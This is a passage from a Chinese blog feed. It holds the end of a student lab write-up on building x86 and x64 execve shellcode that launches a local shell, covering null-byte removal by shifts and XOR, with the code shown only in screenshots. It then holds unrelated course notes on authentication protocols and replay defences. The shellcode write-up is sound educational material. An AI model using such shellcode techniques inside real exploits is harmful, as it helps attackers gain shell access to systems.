start="6"><li>在攻击代码中植入这段shellcode：</li></ol><p>为了方便将这段shellcode转换成数组，实验提供了convert.py来实现这个操作，接下来使用这个脚本文件，将上述shellcode转化成数组：</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104210945794.png" alt="image-20231104210945794"></p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104210951271.png" alt="image-20231104210951271"></p><h2 id="Task-1-b-Eliminating-Zeros-from-the-Code"><a href="#Task-1-b-Eliminating-Zeros-from-the-Code" class="headerlink" title="Task 1.b. Eliminating Zeros from the Code"></a>Task 1.b. Eliminating Zeros from the Code</h2><p>在缓冲区溢出攻击中我们利用了strcpy函数不检查数组边界的特性，但是它会检查字符串结尾符(0x00)，在复制过程中遇到0就会终止，接下来我们将考虑如何处理0x00字符串截断的问题。</p><ol><li>首先根据实验手册的提示，在原本的mysh.s中一共有四处本来需要使用0x00，但是用了一些其他方式来进行处理操作，根据提示找出四处操作：</li></ol><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211000510.png" alt="image-20231104211000510"></p><p>（1） 第一处是作为“&#x2F;bin&#x2F;sh”字符串的结尾。</p><p>（2） 第二处是作为入栈的第二个参数。</p><p>（3） 第三处是环境变量的null值设定。</p><p>（4） 第四处是设置execve（）的系统调用号。</p><ol start="2"><li>实现不利用操作系统忽视多余“&#x2F;”的特点，将对应字符串推入堆栈，而代码中不出现0x00的任务：</li></ol><p><strong>思路</strong>：</p><p>由于题目只需要修改指令为“&#x2F;bin&#x2F;bash”，根据小端存储特性，那么需要先入栈“&#x2F;bash”再入栈“&#x2F;bin”，由于在“&#x2F;bash”入栈的时候一共压入了5个字符，所以我们可以采取shift分方式将eax的低八位赋值为“h”的ASCLL码“0x68”。</p><p>Step1：修改汇编代码如下：</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211011779.png" alt="image-20231104211011779"></p><p>Step2：执行验证</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211016823.png" alt="image-20231104211016823"></p><p>如上图所示，已经成功执行shellcode。</p><p>Step3：查看机器码</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211025139.png" alt="image-20231104211025139"></p><h2 id="Task-1-c-Providing-Arguments-for-System-Calls"><a href="#Task-1-c-Providing-Arguments-for-System-Calls" class="headerlink" title="Task 1.c. Providing Arguments for System Calls"></a>Task 1.c. Providing Arguments for System Calls</h2><p>根据实验要求，我们需要执行命令：</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211033856.png" alt="image-20231104211033856"></p><p>我们需要入栈参数为：</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211037774.png" alt="image-20231104211037774"></p><p><strong>思路</strong>：</p><p>由于我们可以使用“&#x2F;”来填充字符串，于是可以采用如下的拆分方式：</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211042485.png" alt="image-20231104211042485"></p><p>（1）针对“&#x2F;bin&#x2F;sh”：就采取示例代码中的拆分方式，使用“&#x2F;”来填充缺少的字符。</p><p>（2）针对“-c”：采用shift的方式，先填充eax为“-c##”，再将eax的字符串左移2x8&#x3D;16位变为0x632d0000；再右移2x8&#x3D;16位变为0x0000632d。这样就构造出了前面的“00”，再将eax此时的值存入内存。</p><p>（3）针对“ls -la”:前面四个“ls -”直接采用push的方式存入内存；“la”则使用shift方式，先填充eax为“la##”，再将eax字符串左移2x8&#x3D;16位变为0x616c0000；再右移2x8&#x3D;16位变为“0x0000616c”，这样就构造出了前面的“00”，再将eax此时的值存入内存。</p><p>（4）针对截断字符“0x00”，使用eax的异或实现。</p><p>Step1：具体汇编代码如下：</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211052324.png" alt="image-20231104211052324"></p><p>Step2：编译执行</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211057781.png" alt="image-20231104211057781"></p><p>Step3：查看机器码：</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211103606.png" alt="image-20231104211103606"></p><h2 id="Task-1-d-Providing-Environment-Variables-for-execve"><a href="#Task-1-d-Providing-Environment-Variables-for-execve" class="headerlink" title="Task 1.d. Providing Environment Variables for execve()"></a>Task 1.d. Providing Environment Variables for execve()</h2><p>本实验中，需要我们输入环境变量，使用命令“&#x2F;usr&#x2F;bin&#x2F;env”在终端打印环境变量的值。</p><p>构造环境变量的过程与argv[]数组类似，仍然需要将环境变量的值先存入内存，并获取其地址存在寄存器中，最后再依次将对应地址中的值压入栈。</p><p>根据实验要求，其构造的环境变量为：</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211111280.png" alt="image-20231104211111280"></p><p>最终的数组为：</p><p><img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211114940.png" alt="image-20231104211114940"></p><p><strong>思路</strong>：</p><p>首先我们可以采取如下的拆分方式：</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211121237.png" alt="image-20231104211121237"></p><p>针对环境变量：</p><p>（1） env[0]:可以看到针对“aaa&#x3D;1234”可以刚好划分成“aaa&#x3D;”和“1234”，所以直接将两个值push入内存即可，再获取其地址存入寄存器。 </p><p>（2） env[1]:针对“bbb&#x3D;5678”的情况与“aaa&#x3D;1234”类似，直接push就可以了。</p><p>（3） env[2]:针对“cccc&#x3D;1234”则需要划分成三个部分——“cccc”、“&#x3D;123”与“4”，前面两个部分可以直接push，最后的“4”仍然采取shift的方式，先将eax赋零，再将“4###”赋值给eax；先将这个字符串左移3x8&#x3D;24位变为“0x04000000”；再将这个字符串右移3x8&#x3D;24位变为“0x00000004”，最后再获取其地址存入寄存器。</p><p>（4） env[3]:eax异或，再取eax的值（0）存入内存，在获取地址存入寄存器。</p><p>针对命令参数：&#x2F;usr&#x2F;bin&#x2F;env</p><p>可以非常直接地划分成“&#x2F;usr”“&#x2F;bin”“&#x2F;env”直接push，并获取其内存地址在存入寄存器，最后压栈即可。</p><p>Step1：具体汇编代码如下：</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211128714.png" alt="image-20231104211128714"></p><p>Step2：编译执行：</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211134385.png" alt="image-20231104211134385"></p><p>Step3：查看机器码：</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211139892.png" alt="image-20231104211139892"></p><h1 id="二、-Task-2-Using-Code-Segment"><a href="#二、-Task-2-Using-Code-Segment" class="headerlink" title="二、   Task 2: Using Code Segment"></a>二、   Task 2: Using Code Segment</h1><h2 id="2-a代码解释"><a href="#2-a代码解释" class="headerlink" title="2.a代码解释"></a>2.a代码解释</h2><p>​    根据实验手册的提示，我们知道这个汇编代码的含义是先执行“two”部分的汇编指令，在跳转到“one”时，将指令“db ‘&#x2F;bin&#x2F;sh*AAAABBBB’”的地址作为返回地址先压入栈，在“one”中去构造execve（）的参数数据结构，最后返回到shellcode的字符串处执行系统调用，所以我们必须知道execve的参数结构和每一行汇编代码的含义，才能理解mysh2.s的功能。</p><ol><li>Exceve（）系统调用参数数据结构：</li></ol><p>int execve(const char *filename, char *const argv[], char *const envp[]);</p><p>a） filename是要执行的程序的名称</p><p>b） argv是传递给新程序的命令行参数数组，</p><p>c） envp是传递给新程序的环境变量数组</p><ol start="2"><li>每行代码的具体解释如下：</li></ol><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211153622.png" alt="image-20231104211153622"></p><p><strong>注释</strong>：</p><p>（1） 绿框部分即为argv数组的构造方式</p><p>（2） argv[0]存储“&#x2F;bin&#x2F;sh”，*被0填充，作为字符串的结束</p><p>（3） “AAAA”被填充为shellcode的首地址（即argv），在后面把地址传给ecx作为execve的第二个参数。</p><p>（4） argv[1]存储NULL，相当于“BBBB”被替换NULL。</p><p>（5） 最后edx清零是为了保证环境变量为空。</p><h2 id="2-b打印用户环境变量"><a href="#2-b打印用户环境变量" class="headerlink" title="2.b打印用户环境变量"></a>2.b打印用户环境变量</h2><ol><li>构造语句：</li></ol><p>根据题目要求，命令为“&#x2F;usr&#x2F;bin&#x2F;env”，打印内容为“a&#x3D;11”“b&#x3D;22”，所以构造如下命令及参数：</p><p><code>/usr/bin/env - a=11 b=22</code></p><p>其中“-”后面跟上设置的环境变量参数，最终能够将其打印出来，验证如下：</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211215161.png" alt="image-20231104211215161"></p><ol start="2"><li>根据构造的命令编写汇编代码：</li></ol><p><strong>思路：</strong>将命令拆分为四个部分，分别对应了argv数组的5个元素：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">argv[0]=“/usr/bin/env”；</span><br><span class="line"></span><br><span class="line">argv[1]=“-”；</span><br><span class="line"></span><br><span class="line">argv[2]=“a=11”；</span><br><span class="line"></span><br><span class="line">argv[3]=“b=22”；</span><br><span class="line"></span><br><span class="line">argv[4]=NULL。</span><br></pre></td></tr></table></figure><p>设置字节序db为</p><p><code>“/usr/bin/env*-*a=11*b=22*AAAABBBBCCCCDDDDEEEE”</code>*占位符用于填充00，后面的“AAAABBBBCCCCDDDDEEEE”用于存储四个参数的地址。Step1：所以可以编写汇编代码如下：</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211254677.png" alt="image-20231104211254677"></p><p>Step２：GDB调试查看每一步寄存器（主要看ｅｃｘ）的值，下面是部分拼接图：</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211259991.png" alt="image-20231104211259991"></p><p>这说明我们的划分是没有问题的。</p><p>Step３：编译执行：</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211305513.png" alt="image-20231104211305513"></p><p>执行成功。</p><h1 id="三、-Task-3-Writing-64-bit-Shellcode"><a href="#三、-Task-3-Writing-64-bit-Shellcode" class="headerlink" title="三、   Task 3: Writing 64-bit Shellcode"></a>三、   Task 3: Writing 64-bit Shellcode</h1><p>本任务要求我们在64位机器上实现任务1中的功能，64位机器与32位机器的差别就是寄存器的位数不同，在64位机器中，寄存器一共有８个字节。根据实验手册提示，我们可以非常容易想到实现思路。</p><p><strong>思路：</strong>仍然按照task１中的方法拆分“&#x2F;bin&#x2F;bash”，并使用shift方法来输入ｈ。有所不同的是，在单独处理的ｈ上我们需要push8个字节，左右移动56位来保证ｈ的键入。</p><p>Step１：拆分指令</p><p>（如task１，在此不赘述）</p><p>Step２：汇编代码编写：</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211313193.png" alt="image-20231104211313193"></p><p>Step３：编译执行：</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211317108.png" alt="image-20231104211317108"></p><p>成功拿到shell。</p><p>Step４：查看机器码：</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104211322034.png" alt="image-20231104211322034"></p><h1 id="四、-总结"><a href="#四、-总结" class="headerlink" title="四、   总结"></a>四、   总结</h1><p>本次实验主要给我们介绍了两种实现shellcode的方式：</p><p>（１）在堆栈上动态地构造所有必要的数据结构，从而可以从堆栈指针Esp中获得所有必要的数据结构的地址。</p><p>（２）获取所有必要数据结构的地址，在这种方法中，数据存储在代码区域中，并且通过函数调用机制获得其地址。</p><p>同时通过本次实验，我们清楚掌握了系统调用execve（）的具体用法和汇编代码的编写。</p><p>最后还学会了３种在shellcode中处理“00”截断字符的方法：</p><p>（１）  异或</p><p>（２）  使用al低八位赋值</p><p>（３）  使用shift方法处理非整数倍（4、8）字符串。</p><h1 id="附：详细的内存图："><a href="#附：详细的内存图：" class="headerlink" title="附：详细的内存图："></a>附：详细的内存图：</h1><p><img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/QQ%E5%9B%BE%E7%89%8720231030113913-16991036450791.jpg" alt="QQ图片20231030113913"></p><p><img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/QQ%E5%9B%BE%E7%89%8720231030115400-16991036561832.jpg" alt="QQ图片20231030115400"></p>]]></content>
      
      
      <categories>
          
          <category> 安全知识 </category>
          
          <category> 网络攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鉴别机制和技术</title>
      <link href="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/"/>
      <url>/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="鉴别定义"><a href="#鉴别定义" class="headerlink" title="鉴别定义"></a>鉴别定义</h2><ul><li>确认实体是他所申明的</li><li>鉴别是最重要的安全服务之一</li><li>与其他机制的联系<ul><li>是访问控制服务的一种必要将支持</li><li>结合数据完整性机制，数据起源鉴别</li><li>对审计机制的支持</li></ul></li></ul><h2 id="身份鉴别的协议基础"><a href="#身份鉴别的协议基础" class="headerlink" title="身份鉴别的协议基础"></a>身份鉴别的协议基础</h2><ul><li><h3 id="身份鉴别协议"><a href="#身份鉴别协议" class="headerlink" title="身份鉴别协议"></a>身份鉴别协议</h3><ul><li>通信参与者完成相互的身份鉴别或是别而采用的规程、约定、约束和交换信息的总和</li><li>分类<ul><li>双向鉴别协议</li><li>单向鉴别协议</li></ul></li></ul></li></ul><h2 id="实体鉴别系统的组成"><a href="#实体鉴别系统的组成" class="headerlink" title="实体鉴别系统的组成"></a>实体鉴别系统的组成</h2><ul><li>P：出示证件的人</li><li>V：验证者</li><li>TP：可信第三方</li><li>攻击者</li></ul><h3 id="身份鉴别系统的要求"><a href="#身份鉴别系统的要求" class="headerlink" title="身份鉴别系统的要求"></a>身份鉴别系统的要求</h3><ol><li>认得出的概率极大化</li><li>无可传递性</li><li>被攻击者欺骗的概率极小</li><li>计算有效、通信有效</li><li>秘密参数可以安全存储和传输</li></ol><h3 id="网络环境下的要求"><a href="#网络环境下的要求" class="headerlink" title="网络环境下的要求"></a>网络环境下的要求</h3><ol><li>唯一身份表示（ID）</li><li>抗被动威胁（sniff）</li><li>网络上传输的鉴别信息不可重用</li></ol><h3 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h3><p>被动攻击：窃听，不对消息做任何修改</p><p>主动攻击：阻断、伪造、重放——漏洞挖掘、漏洞扫描、漏洞利用、软件升级替换</p><h3 id="实现身份鉴别的途径"><a href="#实现身份鉴别的途径" class="headerlink" title="实现身份鉴别的途径"></a>实现身份鉴别的途径</h3><ul><li>基于——所知、所有、个人特征，双因素，多因素认证。</li></ul><h2 id="鉴别技术分类（单向）"><a href="#鉴别技术分类（单向）" class="headerlink" title="鉴别技术分类（单向）"></a>鉴别技术分类（单向）</h2><ul><li><p>0级鉴别（无）</p></li><li><p>1级鉴别（抗泄露）——F（申请AI、可见别标识符、[数字指纹]）——易受重放攻击</p></li><li><p>2级鉴别（抗泄露、对不同验证者重放的保护【1】）——F（申请AI、可见别标识符、&#x3D;&#x3D;验证者&#x3D;&#x3D;、[数字指纹]）——不能对抗对同一验证者的重放（无法实现对数据源的鉴别（发送出的鉴别的数据来自验证者本人））</p></li><li><p>3级鉴别（抗泄露、对同一验证者重放的保护【2】）——F（申请AI、可见别标识符、&#x3D;&#x3D;唯一数&#x3D;&#x3D;、[数字指纹]）——（唯一数：随机数&#x2F;伪随机数（申请AI生命周期内不可有意重复），时间戳、计数器、密码连）</p></li><li><p>4级鉴别（抗泄露、对同一&#x2F;不同验证者重放的保护）</p><ul><li><p>唯一数机制——F（申请AI、可见别标识符、&#x3D;&#x3D;唯一数、验证者&#x3D;&#x3D;、[数字指纹]）</p></li><li><p>质询机制——质询信息每次都不一样，只有验证者知道</p><ul><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231103092142424.png" alt="image-20231103092142424"></li></ul></li><li><p>专用加密质询　　真情这和验证者首先要铜鼓一个密钥</p><ul><li><p><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231103092415329.png" alt="image-20231103092415329"></p></li><li><blockquote><p>理解：实体鉴别：鉴别是谁</p><p>　　　数据源鉴别：特定数据是否来自指定实体，包含实体鉴别</p></blockquote></li></ul></li><li><p>计算响应机制</p><ul><li>？？？？？</li></ul></li></ul></li></ul><blockquote><p>理解：【1】其中攻击者尝试使用从一个验证者获取的身份验证令牌或凭证来欺骗另一个验证者</p><p>​【2】其中攻击者尝试使用从一个验证者获取的身份验证令牌或凭证来欺骗同一个验证者</p></blockquote><h2 id="按机制的配置分类"><a href="#按机制的配置分类" class="headerlink" title="按机制的配置分类"></a>按机制的配置分类</h2><p>联机可信第三方</p><p>脱机可信第三方</p><h2 id="鉴别协议攻防"><a href="#鉴别协议攻防" class="headerlink" title="鉴别协议攻防"></a>鉴别协议攻防</h2><ul><li><p>核心问题：</p><ul><li>保密性——密钥</li><li>时效性</li></ul></li><li><h3 id="重放"><a href="#重放" class="headerlink" title="重放"></a>重放</h3><ul><li>简单重放：攻击者简答复制一条消息，以后重新发送</li><li>可被日志记录的复制品：两份，可以在一个合法的有效时间创内重放一个带时间戳的消息（非法的记录会在在日志中被记录）</li><li>不能别日志记录的复制品：在２的基础上，原始消息已被拦截</li><li>反向重放</li></ul></li><li><h3 id="对抗重放（非重复值）"><a href="#对抗重放（非重复值）" class="headerlink" title="对抗重放（非重复值）"></a>对抗重放（非重复值）</h3><ul><li>序列号——双方必须保持上次的序列号</li><li>时间戳——</li><li>质询&#x2F;应答——连接性的方式（TCP）</li></ul></li></ul><h2 id="双向鉴别协议"><a href="#双向鉴别协议" class="headerlink" title="双向鉴别协议"></a>双向鉴别协议</h2><p>单向叠加，</p><h2 id="二、鉴别机制"><a href="#二、鉴别机制" class="headerlink" title="二、鉴别机制"></a>二、鉴别机制</h2><h2 id="1-基于非密码的鉴别机制"><a href="#1-基于非密码的鉴别机制" class="headerlink" title="1. 基于非密码的鉴别机制"></a>1. 基于非密码的鉴别机制</h2><ul><li><h3 id="口令机制"><a href="#口令机制" class="headerlink" title="口令机制"></a>口令机制</h3><ul><li><p>口令是鉴别的，密码是加解密的</p></li><li><p>PAP协议（快弃用了）</p></li><li><p>口令机制的脆弱点：</p><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231106082026031.png" alt="image-20231106082026031" style="zoom:50%;"><ul><li><p>对付外部泄露：</p><ul><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231106082343342.png" alt="image-20231106082343342"></li></ul></li><li><p>对付口令猜测：</p><ul><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231106082428576.png" alt="image-20231106082428576"></li></ul></li><li><p>对付线路窃听</p><ul><li>加入散列函数——不能抗重放<ul><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231106082946098.png" alt="image-20231106082946098"></li></ul></li><li>加盐（salt）<ul><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231106083135792.png" alt="image-20231106083135792"></li><li>注册时，系统给用户生成一个salt，验证时，系统把salt发给用户。用户利用这个salt hash之后发给验证者验证。</li></ul></li><li>对付危及验证者<ul><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231106084011728.png" alt="image-20231106084011728"></li></ul></li><li>对付窃听和危及验证<ul><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231106084229649.png" alt="image-20231106084229649"></li></ul></li><li>对付重放攻击的措施<ul><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231106084302207.png" alt="image-20231106084302207"></li></ul></li></ul></li></ul></li><li><h3 id="一次性口令机制（-除了skey还有什么最新的OTP机制呢-）"><a href="#一次性口令机制（-除了skey还有什么最新的OTP机制呢-）" class="headerlink" title="一次性口令机制（&#x3D;&#x3D;除了skey还有什么最新的OTP机制呢&#x3D;&#x3D;）"></a>一次性口令机制（&#x3D;&#x3D;除了skey还有什么最新的OTP机制呢&#x3D;&#x3D;）</h3><ul><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231106084711316.png" alt="image-20231106084711316"><ul><li>没有ts的传输，可能造成：1.如果网络延迟严重，验证通不过；2.如果冗余过大，攻击者也可能重放。</li></ul></li><li>S&#x2F;key：<ul><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231106085915485.png" alt="image-20231106085915485"></li><li>&#x3D;&#x3D;不断向M减小的方向迭代&#x3D;&#x3D;，h的功能是作为验证使用，OTP（m）&#x3D;h（OTP（m-1））</li><li>不能对抗小数攻击<ul><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231106090033088.png" alt="image-20231106090033088"></li></ul></li><li>S&#x2F;Key缺乏完整性保护机制。不能保护用户鉴别过程受 到各种主动攻击：包括注入虚假信息，修改传输过程 中的鉴别数据，修改口令文件等。</li></ul></li><li>质询应答：<ul><li>就是验证者V给定随机值给P，P用这个随机值加密计算再传给V，V再重复计算对比P传过来的加密计算后值，若相同就证明通过，。</li><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231106091414196.png" alt="image-20231106091414196"></li><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231106091442797.png" alt="image-20231106091442797"></li><li>&#x3D;&#x3D;ｑ是ｐ·和ｉｄ经过ｆ后的值&#x3D;&#x3D;</li></ul></li><li>基于地址机制<ul><li>基于地址的机制假定声称者的可鉴别性是以呼叫的源地 址为基础的</li><li>这种机制最大的困难是在一个临时的环境里维持一个连 续的主机和网络地址的联系。地址的转换频繁、质询— 转发或重定向引起了一些主要问题</li><li>基于地址的机制自身&#x3D;&#x3D;不能被作为鉴别机制&#x3D;&#x3D;，但可作为其 它机制的有用补充。</li></ul></li></ul></li></ul><h2 id="2-零知识验证"><a href="#2-零知识验证" class="headerlink" title="2. 零知识验证"></a>2. 零知识验证</h2><ul><li>间接证明，用一种有效的数学方法证明其知道秘密，而 又不泄漏信息给别人，这就是零知识证明问题。</li><li>基于洞穴问题</li><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231106093917603.png" alt="image-20231106093917603"></li></ul></li></ul><h2 id="3-基于密码算法的鉴别机制"><a href="#3-基于密码算法的鉴别机制" class="headerlink" title="3. 基于密码算法的鉴别机制"></a>3. 基于密码算法的鉴别机制</h2><ul><li><h4 id="采用对称密码的鉴别机制"><a href="#采用对称密码的鉴别机制" class="headerlink" title="采用对称密码的鉴别机制"></a>采用对称密码的鉴别机制</h4><ul><li><p>基于对称密码算法的鉴别依靠一定协议下的 数据加密处理。通信双方共享一个密钥（通 常存储在硬件中），该密钥在质询—应答协 议中处理或加密信息交换。</p></li><li><h4 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h4><ul><li><h5 id="无可信第三方参与的机制–单向鉴别"><a href="#无可信第三方参与的机制–单向鉴别" class="headerlink" title="无可信第三方参与的机制–单向鉴别"></a>无可信第三方参与的机制–单向鉴别</h5><ul><li><p><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231106094129829.png" alt="image-20231106094129829"></p><ul><li>​&#x3D;&#x3D;TA：防止重放攻击&#x3D;&#x3D;</li><li>&#x3D;&#x3D;B:B的身份验证唯一标识符，是发给B的&#x3D;&#x3D;</li></ul></li><li><p><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231106094221023.png" alt="image-20231106094221023"></p><ul><li>&#x3D;&#x3D;随机数Ta由B产生——RB&#x3D;&#x3D;</li></ul></li><li><h5 id="无可信第三方参与的机制–双向鉴别"><a href="#无可信第三方参与的机制–双向鉴别" class="headerlink" title="无可信第三方参与的机制–双向鉴别"></a>无可信第三方参与的机制–双向鉴别</h5><ul><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231106094456238.png" alt="image-20231106094456238"></li><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231106094522830.png" alt="image-20231106094522830"><ul><li>&#x3D;&#x3D;B验证完以后，表示B完成了对A的身份鉴别&#x3D;&#x3D;</li><li>&#x3D;&#x3D;第四步是A完成对B身份辨别&#x3D;&#x3D;</li></ul></li></ul></li><li><h5 id="涉及可信第三方的机制–双向鉴别"><a href="#涉及可信第三方的机制–双向鉴别" class="headerlink" title="涉及可信第三方的机制–双向鉴别"></a>涉及可信第三方的机制–双向鉴别</h5><ul><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231110083847389.png" alt="image-20231110083847389"><ul><li>TVPa：明文，带B是给第三方说是发给B的</li><li>TokenTA：TP返回TVPA防止别人冒充可信第三方</li><li>KAB：由TP分发</li></ul></li><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231110084133123.png" alt="image-20231110084133123"></li></ul></li></ul></li></ul></li></ul></li><li><h3 id="采用公开密码算法的机制"><a href="#采用公开密码算法的机制" class="headerlink" title="采用公开密码算法的机制"></a>采用公开密码算法的机制</h3><ul><li><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><ul><li><h5 id="采用公开密码算法的机制—单向鉴别"><a href="#采用公开密码算法的机制—单向鉴别" class="headerlink" title="采用公开密码算法的机制—单向鉴别"></a>采用公开密码算法的机制—单向鉴别</h5><ul><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231110084642467.png" alt="image-20231110084642467"><ul><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231110084711523.png" alt="image-20231110084711523"></li></ul></li></ul></li><li><h4 id="采用公开密码算法的机制—双向鉴别（1）"><a href="#采用公开密码算法的机制—双向鉴别（1）" class="headerlink" title="采用公开密码算法的机制—双向鉴别（1）"></a>采用公开密码算法的机制—双向鉴别（1）</h4><ul><li><strong><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231110084905510.png" alt="image-20231110084905510"></strong></li><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231110084918624.png" alt="image-20231110084918624"></li><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231110084930788.png" alt="image-20231110084930788"></li></ul></li></ul></li></ul></li><li><h4 id="采用密码校验函数的机制"><a href="#采用密码校验函数的机制" class="headerlink" title="采用密码校验函数的机制"></a>采用密码校验函数的机制</h4><ul><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231110085408473.png" alt="image-20231110085408473"></li><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231110085459575.png" alt="image-20231110085459575"></li><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231110085513574.png" alt="image-20231110085513574"></li><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231110085525037.png" alt="image-20231110085525037"></li></ul></li></ul><h3 id="总体简化模型："><a href="#总体简化模型：" class="headerlink" title="总体简化模型："></a>总体简化模型：</h3><p><img 